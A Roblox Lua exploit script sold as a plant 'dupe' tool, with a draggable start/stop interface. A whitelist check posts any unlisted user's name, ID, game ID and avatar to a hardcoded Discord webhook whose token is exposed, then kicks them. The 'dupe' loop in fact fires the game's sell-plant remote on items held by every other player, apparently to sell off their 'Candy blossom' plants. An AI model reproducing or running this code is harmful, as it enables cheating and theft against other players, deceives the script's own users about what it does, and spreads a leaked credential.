local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local PlaceId = game.PlaceId

local whitelistedIDs = {
[6213422090] = true,
[8426083603] = true,
[5803447864] = true,
[4798052898] = true,
[8333341130] = true,
[7717419793] = true,
[1260439688] = true,
}

local webhookUrl = "https://discord.com/api/webhooks/1378276371486216212/y_5GVhkoL0nSBiuy1taScncz2-UCjBvSmmpMakOcQU07TzAx_5LNppYfG1Mis-aKftnP" -- Replace this with your actual Discord webhook

-- Log unauthorized access
local function logUnauthorizedUser(player)
local avatarURL = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%s&width=420&height=420&format=png", player.UserId)
local payload = {
["content"] = "",
["embeds"] = {{
["title"] = "Unauthorized Script Execution",
["description"] = string.format("User: %s\nUserId: %s\nPlaceId: %s", player.Name, player.UserId, PlaceId),
["color"] = 16711680,
["thumbnail"] = {
["url"] = avatarURL
},
["footer"] = {
["text"] = "bad boy alerts"
},
["timestamp"] = DateTime.now():ToIsoDate()
}}
}

pcall(function()  
    HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)  
end)

end

-- Whitelist check
if not whitelistedIDs[LocalPlayer.UserId] then
logUnauthorizedUser(LocalPlayer)
game.StarterGui:SetCore("SendNotification", {
Title = "Access Denied",
Text = "Bad boy you run the script without being whitelisted",
Duration = 5
})
task.wait(2)
LocalPlayer:Kick("You are not whitelisted to use this script.")
return
end

-- UI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DupeScriptUI"
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 340, 0, 210)
MainFrame.Position = UDim2.new(0.5, -170, 0.5, -105)
MainFrame.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
MainFrame.BorderSizePixel = 0
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui

local MinimizeBtn = Instance.new("TextButton")
MinimizeBtn.Size = UDim2.new(0, 28, 0, 24)
MinimizeBtn.Position = UDim2.new(1, -30, 0, 2)
MinimizeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
MinimizeBtn.Text = "_"
MinimizeBtn.TextColor3 = Color3.fromRGB(255,255,255)
MinimizeBtn.Font = Enum.Font.SourceSansBold
MinimizeBtn.TextSize = 18
MinimizeBtn.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -40, 0, 24)
Title.Position = UDim2.new(0, 10, 0, 2)
Title.BackgroundTransparency = 1
Title.Text = "DUPE SCRIPT UI REBORN BY (ALCHEMIST)"
Title.TextColor3 = Color3.fromRGB(180,180,180)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = MainFrame

local StartBtn = Instance.new("TextButton")
StartBtn.Size = UDim2.new(0, 240, 0, 90)
StartBtn.Position = UDim2.new(0.5, -120, 0.5, -50)
StartBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 60)
StartBtn.Text = "START DUPE"
StartBtn.TextColor3 = Color3.fromRGB(255,255,255)
StartBtn.Font = Enum.Font.SourceSansBold
StartBtn.TextSize = 36
StartBtn.Name = "StartBtn"
StartBtn.Parent = MainFrame

local RingtaLabel = Instance.new("TextLabel")
RingtaLabel.Size = UDim2.new(1, 0, 0, 34)
RingtaLabel.Position = UDim2.new(0, 0, 1, -34)
RingtaLabel.BackgroundColor3 = Color3.fromRGB(12, 30, 40)
RingtaLabel.BackgroundTransparency = 0
RingtaLabel.Text = "RINGTA"
RingtaLabel.TextColor3 = Color3.fromRGB(110,200,255)
RingtaLabel.Font = Enum.Font.SourceSansBold
RingtaLabel.TextSize = 26
RingtaLabel.TextStrokeTransparency = 0.4
RingtaLabel.BorderSizePixel = 0
RingtaLabel.Parent = MainFrame

local UIS = game:GetService("UserInputService")
local dragging, dragInput, dragStart, startPos

MainFrame.InputBegan:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 and input.Position.Y < (MainFrame.AbsolutePosition.Y + 28) then
dragging = true
dragStart = input.Position
startPos = MainFrame.Position
input.Changed:Connect(function()
if input.UserInputState == Enum.UserInputState.End then
dragging = false
end
end)
end
end)

MainFrame.InputChanged:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseMovement then
dragInput = input
end
end)

UIS.InputChanged:Connect(function(input)
if input == dragInput and dragging then
local delta = input.Position - dragStart
MainFrame.Position = startPos + UDim2.new(0, delta.X, 0, delta.Y)
end
end)

local minimized = false
MinimizeBtn.MouseButton1Click:Connect(function()
minimized = not minimized
if minimized then
MainFrame.Size = UDim2.new(0, 340, 0, 34)
StartBtn.Visible = false
Title.Visible = false
MinimizeBtn.Text = "+"
else
MainFrame.Size = UDim2.new(0, 340, 0, 210)
StartBtn.Visible = true
Title.Visible = true
MinimizeBtn.Text = "_"
end
end)

RingtaLabel.Visible = true

-- Dupe Logic (for plants)
local running = false
local heartbeatConn

local function startDupingScript()
StartBtn.Text = "STOP DUPE"
StartBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
running = true
heartbeatConn = RunService.Heartbeat:Connect(function()
for _, player in ipairs(Players:GetPlayers()) do
if player ~= LocalPlayer then
local character = player.Character
if character then
local tool = character:FindFirstChild("Candy blossom")
if tool then
pcall(function()
ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("SellPlant_RE"):FireServer(tool)
end)
end
end
end
end
end)
end

local function stopDupingScript()
StartBtn.Text = "START DUPE"
StartBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 60)
running = false
if heartbeatConn then
heartbeatConn:Disconnect()
heartbeatConn = nil
end
end

StartBtn.MouseButton1Click:Connect(function()
if running then
stopDupingScript()
else
startDupingScript()
end
end)

ScreenGui.Parent = game:GetService("CoreGui") or LocalPlayer:WaitForChild("PlayerGui")
